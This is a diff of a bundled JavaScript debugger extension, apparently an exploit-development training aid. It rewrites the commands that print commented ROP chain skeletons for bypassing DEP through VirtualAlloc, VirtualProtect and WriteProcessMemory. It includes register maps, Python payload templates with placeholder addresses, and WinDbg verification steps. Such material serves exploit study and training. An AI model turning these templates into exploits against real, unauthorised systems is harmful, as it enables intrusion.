@@ -11886,10 +11886,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-20T14:46:24.785Z" : globalThis[key2];
+        value = true ? "2026-11-21T11:44:48.761Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "c48c6ba121b9" : globalThis[key2];
+        value = true ? "dcc13681c3a0" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -12158,8 +12158,8 @@ var osed_bundle = (() => {
     "rop.find": "Legacy ROP helper and module triage",
     rop_find: "Flat alias for legacy ROP helper triage",
     rop_suggest: "Suggest exploit-friendly gadget patterns",
-    rop_template: "Print a commented ROP chain skeleton",
-    dep_function: "Print a VirtualAlloc or WriteProcessMemory call-frame skeleton",
+    rop_template: "Print a commented ROP chain skeleton (skeleton or PUSHAD style)",
+    dep_function: "Print a VirtualAlloc, VirtualProtect or WriteProcessMemory call-frame skeleton",
     pivots: "Scan for stack pivot candidates",
     retn: "Scan for retn N gadgets",
     add_esp: "Scan for add esp, N gadgets",
@@ -13337,121 +13337,378 @@ var osed_bundle = (() => {
   }
 
   // src/commands/rop_template.ts
-  function vpTemplate(mod) {
-    section("VirtualProtect DEP Bypass \u2014 ROP Chain Skeleton");
-    print("Prototype: BOOL VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)");
-    print("Goal:      mark shellcode region PAGE_EXECUTE_READWRITE (flNewProtect = 0x40)");
-    section("Step 1 \u2014 find addresses");
-    print(`  VirtualProtect addr:   dx @$osed().sc.iat_find("VirtualProtect")`);
-    print(`  jmp esp (dispatch):    dx @$osed().find_bytes("${mod}", "FF E4")`);
-    print(`  pushad ; ret:          dx @$osed().find_bytes("${mod}", "60 C3")`);
-    print(`  Gadgets (pop/inc/neg): dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);
-    print(`  Stack adjustments:     dx @$osed().add_esp("${mod}")`);
-    print(`  Writable addr:         dx @$osed().modules()  -- pick a .data section address`);
-    section("Step 2 \u2014 PUSHAD technique register map");
-    print("  After PUSHAD ; RET, the stack looks like:");
-    print("    [ESP+0]  = EDI  <- consumed by RET (set to VirtualProtect address)");
-    print("    [ESP+4]  = ESI  <- return addr for VP's RETN 10h (set to jmp esp)");
-    print("    [ESP+8]  = EBP  <- lpAddress  (set to shellcode start)");
-    print("    [ESP+12] = saved_ESP <- dwSize (stack addr \u2014 rounds up, usually OK)");
-    print("    [ESP+16] = EBX  <- flNewProtect = 0x40");
-    print("    [ESP+20] = EDX  <- lpflOldProtect (writable dummy)");
-    print("    [ESP+24] = ECX  <- (unused by VirtualProtect)");
-    print("    [ESP+28] = EAX  <- (unused by VirtualProtect)");
+  function fieldTable(fields) {
+    print(`  ${"Field".padEnd(24)}${"Real value".padEnd(30)}How to get it`);
+    for (const field of fields)
+      print(`  ${field.name.padEnd(24)}${field.value.padEnd(30)}${field.how}`);
+  }
+  function skeletonGadgets(mod) {
+    section("Step 2 \u2014 gadgets the chain needs");
+    print(`  Load the corpus first:  dx @$osed().rop.scan_live("${mod}", "<bad chars>")`);
+    print('  Capture ESP:            dx @$osed().rop.query("capability", "STACK_POINTER_CAPTURE")   push esp ; pop eax ; ret');
+    print('  Copy a register:        dx @$osed().rop.query("capability", "MOVE_REGISTER")           mov esi, eax / push eax ; pop esi');
+    print('  Add or subtract:        dx @$osed().rop.query("capability", "REGISTER_ADD")            add eax, ecx ; ret  (also REGISTER_SUB)');
+    print('  Negate:                 dx @$osed().rop.query("capability", "REGISTER_NEGATE")         neg eax ; ret');
+    print('  Read a pointer:         dx @$osed().rop.query("capability", "MEMORY_READ")             mov eax, [eax] ; ret');
+    print('  Write a field:          dx @$osed().rop.query("capability", "MEMORY_WRITE")            mov [esi], eax ; ret');
+    print('  Next field (+4):        dx @$osed().rop.query("capability", "REGISTER_INCREMENT")      inc esi ; ret, four times');
+    print('  Values with 00 bytes:   dx @$osed().rop.construct("eax", 0x40, "<bad chars>")          a recipe and pack() lines');
+    print(`  Pivot ESP to the frame: ${`dx @$osed().pivots("${mod}", 15)`.padEnd(63)}xchg eax, esp ; ret  or  leave ; ret`);
+  }
+  function skeletonChainStart(apiName, slotName) {
+    print('rop = b""');
+    print("# 1. capture ESP and keep it in a register that the next gadgets do not clobber");
+    print("rop += p32(0x????????)    # push esp ; pop eax ; ret");
+    print("rop += p32(0x????????)    # push eax ; pop esi ; ret   (ESI = working pointer)");
+    print("# 2. move ESI back to the first field: ESI + negative distance (measure it with dd at a bp)");
+    print("rop += p32(0x????????)    # pop ecx ; ret");
+    print("rop += p32(0x????????)    # negative distance, e.g. 0xFFFFFFxx, no 00 bytes");
+    print("rop += p32(0x????????)    # add esi, ecx ; ret  (or add eax, ecx, then move it back to esi)");
+    print(`# 3. field 1: ${apiName} = [${slotName}]`);
+    print("rop += p32(0x????????)    # pop eax ; ret");
+    print(`${`rop += p32(${slotName})`.padEnd(26)}# a slot with bad bytes: rop.construct or two clean constants`);
+    print("rop += p32(0x????????)    # mov eax, [eax] ; ret");
+    print("rop += p32(0x????????)    # mov [esi], eax ; ret");
+    print("rop += p32(0x????????) * 4  # inc esi ; ret  -> field 2");
+  }
+  function skeletonTail(frameName, target) {
+    print("");
+    print('shellcode = b"\\x90" * 16 + b"..."   # msfvenom ... -b "<bad chars>"');
+    print(`payload  = b"A" * (OFFSET - len(${frameName})) + ${frameName} + rop`);
+    print(`payload += b"C" * ???     # padding so the shellcode lands where ${target}`);
+    print("payload += shellcode");
+  }
+  function vaSkeletonTemplate(mod) {
+    section("VirtualAlloc DEP Bypass \u2014 Skeleton Method (patch each field)");
+    print("Prototype: LPVOID VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)");
+    print("Goal:      on a page that is already committed, MEM_COMMIT with flProtect = 0x40");
+    print("           only changes its protection, so the stack becomes PAGE_EXECUTE_READWRITE.");
+    print("Idea:      put a 6-dword frame with dummy values in the buffer, let the ROP chain");
+    print("           overwrite each dummy with the real value, then pivot ESP onto the frame.");
+    section("Step 1 \u2014 values and where each one comes from");
+    fieldTable([
+      { name: "VirtualAlloc", value: "address read from the IAT", how: 'dx @$osed().sc.iat_find("VirtualAlloc")  (the slot, then mov eax, [eax])' },
+      { name: "Return address", value: "shellcode address", how: "ESP captured at run time + measured offset" },
+      { name: "lpAddress", value: "shellcode address", how: "same value as the return address" },
+      { name: "dwSize", value: "0x1", how: "any size inside one page: pop 0xFFFFFFFF ; neg" },
+      { name: "flAllocationType", value: "0x1000 (MEM_COMMIT)", how: 'dx @$osed().rop.construct("eax", 0x1000, "<bad chars>")' },
+      { name: "flProtect", value: "0x40 (PAGE_EXECUTE_RW)", how: "pop 0xFFFFFFC0 ; neg" }
+    ]);
+    skeletonGadgets(mod);
     section("Step 3 \u2014 Python skeleton");
     print("import struct");
-    print("def p32(v): return struct.pack('<I', v)");
+    print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
     print("");
-    print("OFFSET   = ???           # bytes from buffer start to EIP control");
-    print('VP       = 0x????????    # VirtualProtect  dx @$osed().sc.iat_find("VirtualProtect")');
-    print(`JMP_ESP  = 0x????????    # jmp esp         dx @$osed().find_bytes("${mod}", "FF E4")`);
-    print("WRITABLE = 0x????????    # writable addr   dx @$osed().modules() -> .data section");
-    print("LP_ADDR  = 0x????????    # shellcode addr  compute from ESP (see step 4)");
+    print("OFFSET = ???              # bytes from buffer start to EIP");
+    print('VA_IAT = 0x????????       # IAT slot of VirtualAlloc  dx @$osed().sc.iat_find("VirtualAlloc")');
     print("");
-    print('rop_chain = b""');
+    print('# dummy frame, placed just before EIP (dx @$osed().dep_function("VirtualAlloc") prints the same order)');
+    print("va  = p32(0x45454545)     # VirtualAlloc address  <- patched by the chain");
+    print("va += p32(0x46464646)     # return address        <- shellcode address");
+    print("va += p32(0x47474747)     # lpAddress             <- shellcode address");
+    print("va += p32(0x48484848)     # dwSize                <- 0x1");
+    print("va += p32(0x49494949)     # flAllocationType      <- 0x1000");
+    print("va += p32(0x51515151)     # flProtect             <- 0x40");
     print("");
-    print("# \u2500\u2500 Register setup (PUSHAD technique) \u2500\u2500");
-    print("rop_chain += p32(0x????????)  # pop edi ; ret");
-    print("rop_chain += p32(VP)          # EDI = VirtualProtect address");
-    print("");
-    print("rop_chain += p32(0x????????)  # pop esi ; ret");
-    print("rop_chain += p32(JMP_ESP)     # ESI = jmp esp (return to shellcode after VP)");
-    print("");
-    print("rop_chain += p32(0x????????)  # pop ebp ; ret");
-    print("rop_chain += p32(LP_ADDR)     # EBP = lpAddress (shellcode start, see step 4)");
-    print("");
-    print("rop_chain += p32(0x????????)  # pop ebx ; ret");
-    print("rop_chain += p32(0x00000040)  # EBX = flNewProtect (PAGE_EXECUTE_READWRITE)");
-    print("");
-    print("rop_chain += p32(0x????????)  # pop edx ; ret");
-    print("rop_chain += p32(WRITABLE)    # EDX = lpflOldProtect dummy");
-    print("");
-    print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused \u2014 any writable value)");
-    print("rop_chain += p32(WRITABLE)");
-    print("");
-    print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused \u2014 put 0 or junk)");
-    print("rop_chain += p32(0x90909090)");
-    print("");
-    print("rop_chain += p32(0x????????)  # pushad ; ret");
-    print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
-    print("");
-    print("# \u2500\u2500 NOP sled + shellcode \u2500\u2500");
-    print('nop_sled  = b"\\x90" * 16    # dx @$osed().nop(16)');
-    print('shellcode = nop_sled + b"\\xfc\\xe8..."  # your payload');
-    print('                               # dx @$osed().encode("FC E8 ...", "00 0A 0D")');
-    print("");
-    print('payload = b"A" * OFFSET + rop_chain + shellcode');
-    section("Step 4 \u2014 compute LP_ADDR (shellcode stack address)");
-    print("  The PUSHAD technique uses the saved ESP (stack addr before PUSHAD) as dwSize.");
-    print("  To find LP_ADDR (EBP = shellcode location on stack):");
-    print("  1. Run exploit with 'CC' shellcode; check EBP at VirtualProtect breakpoint.");
-    print("  2. Or: prepend gadgets to capture ESP and add the chain-to-shellcode offset:");
-    print("       dx @$osed().rop_suggest(...)  ->  push esp ; pop eax ; ret");
-    print("       dx @$osed().add_esp(...)      ->  add eax, N ; ret   (N = measured offset)");
-    print("     Then use a  mov [writable], eax ; ret  gadget and patch EBP from that addr.");
+    skeletonChainStart("VirtualAlloc", "VA_IAT");
+    print("# 4. fields 2 and 3: shellcode address = ESI + distance to the shellcode");
+    print("# 5. field 4: dwSize = 0x1      (pop eax 0xFFFFFFFF ; neg eax)");
+    print('# 6. field 5: 0x1000           (rop.construct("eax", 0x1000, ...))');
+    print("# 7. field 6: 0x40             (pop eax 0xFFFFFFC0 ; neg eax)");
+    print("# 8. pivot: ESI - 0x14 = field 1, move it into ESP");
+    print("rop += p32(0x????????)    # xchg eax, esp ; ret  (EAX = field 1)  or leave ; ret (EBP = field 1 - 4)");
+    skeletonTail("va", "fields 2 and 3 point");
+    section("Step 4 \u2014 check each field before the next one");
+    print("  bp <first gadget> ; g ; dd esp-1c L6                          the dummy frame, 45454545 to 51515151");
+    print("  bp <gadget after a write> ; g ; dd esi L1                     the patched field holds the real value");
+    print("  bp KERNELBASE!VirtualAlloc ; g ; dds esp L5                   return, lpAddress, 0x1, 0x1000, 0x40");
+    print("  pt ; !vprot <shellcode address>                               Protect: 00000040 PAGE_EXECUTE_READWRITE");
   }
-  function wpmTemplate(mod) {
-    section("WriteProcessMemory DEP Bypass \u2014 ROP Chain Skeleton");
-    print("Prototype: BOOL WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpBytesWritten)");
-    print("Goal:      copy shellcode into a known-executable .text section, then jump to it.");
-    section("Find addresses");
-    print(`  WriteProcessMemory:  dx @$osed().sc.iat_find("WriteProcessMemory")`);
-    print(`  Writable addr:       dx @$osed().modules()  -- any .data section`);
-    print(`  Executable target:   dx @$osed().modules()  -- any .text section address`);
-    print(`  Gadgets:             dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);
-    section("Python skeleton");
+  function vaPushadTemplate(mod) {
+    section("VirtualAlloc DEP Bypass \u2014 PUSHAD Method");
+    print("Prototype: LPVOID VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)");
+    print("Goal:      load each register, then PUSHAD writes the whole call frame in one instruction.");
+    print("Catch:     every register needs a clean gadget, and a later gadget must not clobber an");
+    print("           earlier register. When one is missing, use the skeleton method instead.");
+    section("Step 1 \u2014 find addresses");
+    print('  VirtualAlloc slot:     dx @$osed().sc.iat_find("VirtualAlloc")');
+    print(`  Gadgets:               dx @$osed().rop.scan_live("${mod}", "<bad chars>")  then  rop.query(...)`);
+    print(`  pushad ; ret:          dx @$osed().find_bytes("${mod}", "60 C3")`);
+    print(`  jmp esp / call esp:    dx @$osed().find_bytes("${mod}", "FF E4")  or  "FF D4"`);
+    print('  Clean constants:       dx @$osed().rop.construct("ecx", 0x40, "<bad chars>")');
+    print('  Load order:            dx @$osed().rop.setup("ebx=0x1 edx=0x1000 ecx=0x40", "<bad chars>")');
+    section("Step 2 \u2014 PUSHAD register map");
+    print("  PUSHAD pushes EAX, ECX, EDX, EBX, the original ESP, EBP, ESI, EDI. After it, from ESP up:");
+    print("    [ESP+0]  = EDI        <- ret ; (a ROP NOP, the RET of pushad lands here)");
+    print("    [ESP+4]  = ESI        <- VirtualAlloc address (read from the IAT slot)");
+    print("    [ESP+8]  = EBP        <- return address of VirtualAlloc: jmp esp / call esp");
+    print("    [ESP+12] = saved ESP  <- lpAddress: points into the stack for free");
+    print("    [ESP+16] = EBX        <- dwSize = 0x1");
+    print("    [ESP+20] = EDX        <- flAllocationType = 0x1000");
+    print("    [ESP+24] = ECX        <- flProtect = 0x40");
+    print("    [ESP+28] = EAX        <- 0x90909090, the start of the NOP sled");
+    section("Step 3 \u2014 Python skeleton");
     print("import struct");
-    print("def p32(v): return struct.pack('<I', v)");
+    print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
     print("");
-    print("OFFSET      = ???          # EIP control offset");
-    print("WPM         = 0x????????   # WriteProcessMemory  dx @$osed().sc.iat_find(...)");
-    print("EXEC_TARGET = 0x????????   # executable .text address to write shellcode into");
-    print("WRITABLE    = 0x????????   # .data writable addr");
-    print("SC_SRC      = 0x????????   # shellcode source (stack addr \u2014 compute dynamically)");
+    print("OFFSET = ???");
+    print('VA_IAT = 0x????????       # dx @$osed().sc.iat_find("VirtualAlloc")');
     print("");
-    print("# PUSHAD register map for WriteProcessMemory(hProcess, lpBase, lpBuf, nSize, lpWritten):");
-    print("#   EDI = WPM            ESI = return addr   EBP = hProcess (0xFFFFFFFF = current)");
-    print("#   EBX = lpBaseAddress  EDX = lpBuffer      ECX = nSize    EAX = lpBytesWritten");
+    print('rop = b""');
+    print("# ESI = VirtualAlloc (read the slot first, then move it to ESI)");
+    print("rop += p32(0x????????)    # pop eax ; ret");
+    print("rop += p32(VA_IAT)");
+    print("rop += p32(0x????????)    # mov eax, [eax] ; ret");
+    print("rop += p32(0x????????)    # xchg eax, esi ; ret");
+    print("# EBP = jmp esp");
+    print("rop += p32(0x????????)    # pop ebp ; ret");
+    print(`rop += p32(0x????????)    # jmp esp  dx @$osed().find_bytes("${mod}", "FF E4")`);
+    print("# EBX = 0x1, EDX = 0x1000, ECX = 0x40 (each built without 00 bytes)");
+    print('rop += p32(0x????????)    # ... rop.construct("ebx", 0x1, ...)');
+    print('rop += p32(0x????????)    # ... rop.construct("edx", 0x1000, ...)');
+    print('rop += p32(0x????????)    # ... rop.construct("ecx", 0x40, ...)');
+    print("# EDI = ROP NOP, EAX = NOPs");
+    print("rop += p32(0x????????)    # pop edi ; ret");
+    print("rop += p32(0x????????)    # address of any ret");
+    print("rop += p32(0x????????)    # pop eax ; ret");
+    print("rop += p32(0x90909090)");
+    print("rop += p32(0x????????)    # pushad ; ret");
     print("");
-    print('rop_chain = b""');
-    print("rop_chain += p32(0x????????)  # pop edi ; ret");
-    print("rop_chain += p32(WPM)");
-    print("rop_chain += p32(0x????????)  # pop esi ; ret");
-    print("rop_chain += p32(0x????????)  # return addr after WPM (jmp to EXEC_TARGET)");
-    print("rop_chain += p32(0x????????)  # pop ebp ; ret");
-    print("rop_chain += p32(0xFFFFFFFF)  # hProcess = GetCurrentProcess()");
-    print("rop_chain += p32(0x????????)  # pop ebx ; ret");
-    print("rop_chain += p32(EXEC_TARGET) # lpBaseAddress");
-    print("rop_chain += p32(0x????????)  # pop edx ; ret");
-    print("rop_chain += p32(SC_SRC)      # lpBuffer (shellcode source on stack)");
-    print("rop_chain += p32(0x????????)  # pop ecx ; ret");
-    print("rop_chain += p32(0x00000201)  # nSize");
-    print("rop_chain += p32(0x????????)  # pop eax ; ret");
-    print("rop_chain += p32(WRITABLE)    # lpBytesWritten (dummy writable)");
-    print("rop_chain += p32(0x????????)  # pushad ; ret");
+    print('shellcode = b"\\x90" * 16 + b"..."');
+    print('payload = b"A" * OFFSET + rop + shellcode');
+    section("Step 4 \u2014 check");
+    print("  bp <pushad ; ret> ; g ; p ; dds esp L8                        the map above, in this order");
+    print("  bp KERNELBASE!VirtualAlloc ; g ; dds esp L5                   jmp esp, stack address, 0x1, 0x1000, 0x40");
+  }
+  function vpSkeletonTemplate(mod) {
+    section("VirtualProtect DEP Bypass \u2014 Skeleton Method (patch each field)");
+    print("Prototype: BOOL VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)");
+    print("Goal:      give the stack page that holds the shellcode PAGE_EXECUTE_READWRITE (0x40).");
+    print("Idea:      put a 6-dword frame with dummy values in the buffer, let the ROP chain");
+    print("           overwrite each dummy with the real value, then pivot ESP onto the frame.");
+    section("Step 1 \u2014 values and where each one comes from");
+    fieldTable([
+      { name: "VirtualProtect", value: "address read from the IAT", how: 'dx @$osed().sc.iat_find("VirtualProtect")  (the slot, then mov eax, [eax])' },
+      { name: "Return address", value: "shellcode address", how: "ESP captured at run time + measured offset" },
+      { name: "lpAddress", value: "shellcode address", how: "same value as the return address" },
+      { name: "dwSize", value: "0x201", how: "covers the shellcode, even across a page edge: pop 0xFFFFFDFF ; neg" },
+      { name: "flNewProtect", value: "0x40 (PAGE_EXECUTE_RW)", how: "pop 0xFFFFFFC0 ; neg" },
+      { name: "lpflOldProtect", value: "a writable address", how: `dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")` }
+    ]);
+    print("  lpflOldProtect must be writable or VirtualProtect fails. A STAGING cave lies in a writable");
+    print("  section such as .data. A module without ASLR keeps it fixed, so it can stay a literal in the frame.");
+    skeletonGadgets(mod);
+    section("Step 3 \u2014 Python skeleton");
+    print("import struct");
+    print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
     print("");
-    print('shellcode = b"\\x90" * 16 + b"\\xfc\\xe8..."');
-    print('payload   = b"A" * OFFSET + rop_chain + shellcode');
+    print("OFFSET   = ???            # bytes from buffer start to EIP");
+    print('VP_IAT   = 0x????????     # IAT slot of VirtualProtect  dx @$osed().sc.iat_find("VirtualProtect")');
+    print(`WRITABLE = 0x????????     # writable dword  dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")`);
+    print("");
+    print('# dummy frame, placed just before EIP (dx @$osed().dep_function("VirtualProtect") prints the same order)');
+    print("vp  = p32(0x45454545)     # VirtualProtect address  <- patched by the chain");
+    print("vp += p32(0x46464646)     # return address          <- shellcode address");
+    print("vp += p32(0x47474747)     # lpAddress               <- shellcode address");
+    print("vp += p32(0x48484848)     # dwSize                  <- 0x201");
+    print("vp += p32(0x49494949)     # flNewProtect            <- 0x40");
+    print("vp += p32(WRITABLE)       # lpflOldProtect          literal when clean, else patch it too");
+    print("");
+    skeletonChainStart("VirtualProtect", "VP_IAT");
+    print("# 4. fields 2 and 3: shellcode address = ESI + distance to the shellcode");
+    print("# 5. field 4: dwSize = 0x201    (pop eax 0xFFFFFDFF ; neg eax)");
+    print("# 6. field 5: 0x40             (pop eax 0xFFFFFFC0 ; neg eax)");
+    print("# 7. field 6: only if WRITABLE has bad bytes (rop.construct, then mov [esi], eax)");
+    print("# 8. pivot: ESI - 0x10 = field 1 after field 5 (ESI - 0x14 after field 6), move it into ESP");
+    print("rop += p32(0x????????)    # xchg eax, esp ; ret  (EAX = field 1)  or leave ; ret (EBP = field 1 - 4)");
+    skeletonTail("vp", "fields 2 and 3 point");
+    section("Step 4 \u2014 check each field before the next one");
+    print("  bp <first gadget> ; g ; dd esp-1c L6                          the dummy frame and WRITABLE");
+    print("  bp <gadget after a write> ; g ; dd esi L1                     the patched field holds the real value");
+    print("  bp KERNELBASE!VirtualProtect ; g ; dds esp L5                 return, lpAddress, 0x201, 0x40, WRITABLE");
+    print("  pt ; !vprot <shellcode address>                               Protect: 00000040 PAGE_EXECUTE_READWRITE");
+    print("  dd <WRITABLE> L1                                              the old protection, usually 00000004");
+  }
+  function vpPushadTemplate(mod) {
+    section("VirtualProtect DEP Bypass \u2014 PUSHAD Method");
+    print("Prototype: BOOL VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)");
+    print("Goal:      load each register, then PUSHAD writes the whole call frame in one instruction.");
+    print("Catch:     every register needs a clean gadget, and a later gadget must not clobber an");
+    print("           earlier register. When one is missing, use the skeleton method instead.");
+    section("Step 1 \u2014 find addresses");
+    print('  VirtualProtect slot:   dx @$osed().sc.iat_find("VirtualProtect")');
+    print(`  Gadgets:               dx @$osed().rop.scan_live("${mod}", "<bad chars>")  then  rop.query(...)`);
+    print(`  pushad ; ret:          dx @$osed().find_bytes("${mod}", "60 C3")`);
+    print(`  jmp esp / call esp:    dx @$osed().find_bytes("${mod}", "FF E4")  or  "FF D4"`);
+    print(`  Writable address:      dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")`);
+    print('  Load order:            dx @$osed().rop.setup("ebx=0x201 edx=0x40", "<bad chars>")');
+    section("Step 2 \u2014 PUSHAD register map");
+    print("  PUSHAD pushes EAX, ECX, EDX, EBX, the original ESP, EBP, ESI, EDI. After it, from ESP up:");
+    print("    [ESP+0]  = EDI        <- ret ; (a ROP NOP, the RET of pushad lands here)");
+    print("    [ESP+4]  = ESI        <- VirtualProtect address (read from the IAT slot)");
+    print("    [ESP+8]  = EBP        <- return address of VirtualProtect: jmp esp / call esp");
+    print("    [ESP+12] = saved ESP  <- lpAddress: points into the stack for free");
+    print("    [ESP+16] = EBX        <- dwSize = 0x201");
+    print("    [ESP+20] = EDX        <- flNewProtect = 0x40");
+    print("    [ESP+24] = ECX        <- lpflOldProtect = a writable address");
+    print("    [ESP+28] = EAX        <- 0x90909090, jmp esp runs it, then the shellcode");
+    section("Step 3 \u2014 Python skeleton");
+    print("import struct");
+    print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
+    print("");
+    print("OFFSET   = ???");
+    print('VP_IAT   = 0x????????     # dx @$osed().sc.iat_find("VirtualProtect")');
+    print("WRITABLE = 0x????????     # writable dword, see step 1");
+    print("");
+    print('rop = b""');
+    print("# ESI = VirtualProtect (read the slot first, then move it to ESI)");
+    print("rop += p32(0x????????)    # pop eax ; ret");
+    print("rop += p32(VP_IAT)");
+    print("rop += p32(0x????????)    # mov eax, [eax] ; ret");
+    print("rop += p32(0x????????)    # xchg eax, esi ; ret");
+    print("# EBP = jmp esp");
+    print("rop += p32(0x????????)    # pop ebp ; ret");
+    print(`rop += p32(0x????????)    # jmp esp  dx @$osed().find_bytes("${mod}", "FF E4")`);
+    print("# EBX = 0x201, EDX = 0x40 (each built without 00 bytes), ECX = WRITABLE");
+    print("rop += p32(0x????????)    # pop ebx ; ret");
+    print("rop += p32(0xFFFFFDFF)    # -0x201");
+    print("rop += p32(0x????????)    # neg ebx ; ret");
+    print("rop += p32(0x????????)    # pop edx ; ret");
+    print("rop += p32(0xFFFFFFC0)    # -0x40");
+    print("rop += p32(0x????????)    # neg edx ; ret");
+    print("rop += p32(0x????????)    # pop ecx ; ret");
+    print("rop += p32(WRITABLE)");
+    print("# EDI = ROP NOP, EAX = NOPs");
+    print("rop += p32(0x????????)    # pop edi ; ret");
+    print("rop += p32(0x????????)    # address of any ret");
+    print("rop += p32(0x????????)    # pop eax ; ret");
+    print("rop += p32(0x90909090)");
+    print(`rop += p32(0x????????)    # pushad ; ret  dx @$osed().find_bytes("${mod}", "60 C3")`);
+    print("");
+    print('shellcode = b"\\x90" * 16 + b"..."   # dx @$osed().nop(16)');
+    print('payload = b"A" * OFFSET + rop + shellcode');
+    section("Step 4 \u2014 check");
+    print("  bp <pushad ; ret> ; g ; p ; dds esp L8                        the map above, in this order");
+    print("  bp KERNELBASE!VirtualProtect ; g ; dds esp L5                 jmp esp, stack address, 0x201, 0x40, WRITABLE");
+    print("  pt ; !vprot <stack address>                                   Protect: 00000040 PAGE_EXECUTE_READWRITE");
+  }
+  function wpmSkeletonTemplate(mod) {
+    section("WriteProcessMemory DEP Bypass \u2014 Skeleton Method (patch each field)");
+    print("Prototype: BOOL WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)");
+    print("Goal:      copy the shellcode into a code cave in an executable .text section, then return into it.");
+    print("           WriteProcessMemory makes a read-only page writable for the copy and restores it after.");
+    print("Idea:      put a 7-dword frame in the buffer, let the ROP chain patch the fields only known at");
+    print("           run time, then pivot ESP onto the frame. Fixed, clean values stay literal.");
+    section("Step 1 \u2014 values and where each one comes from");
+    fieldTable([
+      { name: "WriteProcessMemory", value: "address read from the IAT", how: 'dx @$osed().sc.iat_find("WriteProcessMemory")  (the slot, then mov eax, [eax])' },
+      { name: "Return address", value: "code cave address", how: `dx @$osed().code_caves("${mod}", 0x200, 25, "<bad chars>", "EXEC")` },
+      { name: "hProcess", value: "0xFFFFFFFF", how: "the pseudo handle of the current process, a literal" },
+      { name: "lpBaseAddress", value: "code cave address", how: "same value as the return address" },
+      { name: "lpBuffer", value: "shellcode address (stack)", how: "ESP captured at run time + measured offset" },
+      { name: "nSize", value: "shellcode length", how: "e.g. 0x210: pop 0xFFFFFDF0 ; neg" },
+      { name: "lpNumberOfBytesWritten", value: "a writable address", how: `dx @$osed().code_caves("${mod}", 4, 25, "<bad chars>", "STAGING")` }
+    ]);
+    print("  The cave must sit in a module without ASLR, and its address must be free of bad bytes.");
+    print("  The cave is not writable once the copy ends, so a decoder that rewrites the shellcode in place");
+    print("  crashes there. Keep the payload free of bad bytes without a self-modifying decoder.");
+    skeletonGadgets(mod);
+    section("Step 3 \u2014 Python skeleton");
+    print("import struct");
+    print("def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)");
+    print("");
+    print("OFFSET   = ???            # bytes from buffer start to EIP");
+    print('WPM_IAT  = 0x????????     # IAT slot of WriteProcessMemory  dx @$osed().sc.iat_find("WriteProcessMemory")');
+    print("CAVE     = 0x????????     # executable code cave, see step 1");
+    print("WRITABLE = 0x????????     # writable dword, see step 1");
+    print("");
+    print('# frame, placed just before EIP (dx @$osed().dep_function("WriteProcessMemory") prints the same order)');
+    print("wpm  = p32(0x45454545)    # WriteProcessMemory address  <- patched by the chain");
+    print("wpm += p32(CAVE)          # return address              literal");
+    print("wpm += p32(0xFFFFFFFF)    # hProcess                    literal");
+    print("wpm += p32(CAVE)          # lpBaseAddress               literal");
+    print("wpm += p32(0x46464646)    # lpBuffer                    <- shellcode address");
+    print("wpm += p32(0x47474747)    # nSize                       <- 0x210");
+    print("wpm += p32(WRITABLE)      # lpNumberOfBytesWritten      literal");
+    print("");
+    skeletonChainStart("WriteProcessMemory", "WPM_IAT");
+    print("rop += p32(0x????????) * 12 # inc esi ; ret  -> field 5 (or add esi with a clean negative)");
+    print("# 4. field 5: lpBuffer = ESI + distance to the shellcode, then mov [esi], eax");
+    print("# 5. field 6: nSize = 0x210     (pop eax 0xFFFFFDF0 ; neg eax), then mov [esi+4] or inc esi x4");
+    print("# 6. pivot: frame start = field 6 - 0x14, move it into ESP");
+    print("rop += p32(0x????????)    # xchg eax, esp ; ret  (EAX = field 1)  or leave ; ret (EBP = field 1 - 4)");
+    skeletonTail("wpm", "field 5 points");
+    section("Step 4 \u2014 check each field before the next one");
+    print("  bp <first gadget> ; g ; dd esp-20 L7                          the frame, dummies and literals");
+    print("  bp <gadget after a write> ; g ; dd esi L1                     the patched field holds the real value");
+    print("  bp KERNELBASE!WriteProcessMemory ; g ; dds esp L6             CAVE, FFFFFFFF, CAVE, stack address, 0x210, WRITABLE");
+    print("  pt ; u <CAVE>                                                 the shellcode, copied into the cave");
+    print("  !vprot <CAVE>                                                 Protect: 00000020 PAGE_EXECUTE_READ, as before");
+  }
+  function wpmPushadTemplate(mod) {
+    section("WriteProcessMemory DEP Bypass \u2014 PUSHAD Method");
+    print("Prototype: BOOL WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)");
+    print("Goal:      copy the shellcode into an executable code cave, then return into it.");
+    print("Catch:     after pushad ; ret the saved ESP sits in the slot where the second argument goes,");
+    print("           and for WriteProcessMemory that is lpBaseAddress, which must be the cave. So EDI holds");
+    print("           a gadget that pops three dwords and execution resumes at EBX. The last three");
+    print("           arguments then come from the dwords right after the pushad gadget in the payload.");
+    print("           lpBuffer is a stack address, so it still needs one write. The skeleton method is simpler.");
+    section("Step 1 \u2014 find addresses");
+    print('  WriteProcessMemory:    dx @$osed().sc.iat_find("WriteProcessMemory")');
+    print(`  Gadgets:               dx @$osed().rop.scan_live("${mod}", "<bad chars>")  then  rop.query(...)`);
+    print(`  pushad ; ret:          dx @$osed().find_bytes("${mod}", "60 C3")`);
